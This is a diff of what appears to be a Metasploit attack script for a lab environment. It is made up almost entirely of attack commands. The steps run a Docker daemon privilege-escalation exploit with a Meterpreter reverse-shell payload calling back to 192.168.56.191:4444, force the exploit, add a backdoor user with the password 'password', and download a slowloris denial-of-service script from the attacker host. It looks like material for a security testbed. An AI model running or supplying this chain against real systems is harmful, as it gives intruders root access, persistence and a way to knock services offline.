@@ -26,26 +26,26 @@ exploit -z
 # ============================================================
 
 use exploit/linux/local/docker_daemon_privilege_escalation
-set PAYLOAD linux/x86/meterpreter_reverse_tcp
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
 set SESSION 1
 set LHOST 192.168.56.191
 set LPORT 4444
 set PayloadLinuxMinKernel 3.17
-exploit -j -z
-# set ForceExploit true (use if necessary)
+set ForceExploit true
+exploit -z
 
 # ============================================================
 # STEP 4 - Docker Daemon Privilege Escalation 2
 # ============================================================
 
 use exploit/linux/local/docker_daemon_privilege_escalation
-set PAYLOAD linux/x86/meterpreter_reverse_tcp
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
 set SESSION 1
 set LHOST 192.168.56.191
 set LPORT 4444
 set PayloadLinuxMinKernel 3.17
-exploit -j -z
-# set ForceExploit true (use if necessary)
+set ForceExploit true
+exploit -z
 
 sessions -i
 useradd -p "$(openssl passwd -1 password)" cremetest
@@ -55,7 +55,7 @@ useradd -p "$(openssl passwd -1 password)" cremetest
 # ============================================================
 
 sessions -i
-wget --no-check-certificate http://192.168.56.191:8000/downloads/local_slowloris.py
+wget http://192.168.56.191:8000/downloads/local_slowloris.py
 
 # ============================================================
 # STEP 6 - End Point DOS
